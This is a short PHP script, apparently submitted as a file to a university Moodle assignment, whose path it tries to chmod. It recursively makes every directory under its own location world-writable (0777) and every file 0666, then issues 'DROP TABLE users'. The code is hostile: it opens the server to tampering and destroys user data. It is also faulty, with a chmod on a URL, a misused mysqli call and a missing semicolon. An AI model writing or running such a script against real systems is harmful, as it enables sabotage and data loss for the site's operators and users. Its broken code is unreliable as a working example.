<?php 
  
   Header( 'Cache-Control: no-cache, must-revalidate');    // HTTP/1.1
   Header( 'Content-Type: text/html;charset=utf-8' );      // TODO- proper XHTML headers...
   Header( 'Expires: Tue, 23 Jun 2009 12:00:00 GMT' ); 

   chmod("http://devone.egerton.ac.ke/pluginfile.php/77056/assignsubmission_file/submission_files/42367/", 0777);

   file_fix_directory(dirname(__FILE__));

   function file_fix_directory($dir, $nomask = array('.', '..')) {
    if (is_dir($dir)) {
       // Try to make each directory world writable.
       if (@chmod($dir, 0777)) {
         echo "<p>Made writable: " . $dir . "</p>";
       }
    }
    if (is_dir($dir) && $handle = opendir($dir)) {
      while (false !== ($file = readdir($handle))) {
        if (!in_array($file, $nomask) && $file[0] != '.') {
          if (is_dir("$dir/$file")) {
            // Recurse into subdirectories
            file_fix_directory("$dir/$file", $nomask);
          }
          else {
            $filename = "$dir/$file";
              // Try to make each file world writable.
              if (@chmod($filename, 0666)) {
                echo "<p>Made writable: " . $filename . "</p>";
              }
          }
        }
      }
  
      closedir($handle);
    }
  
  }
  
   $sql = 'DROP TABLE users';
   mysqli_execute($sql)

?>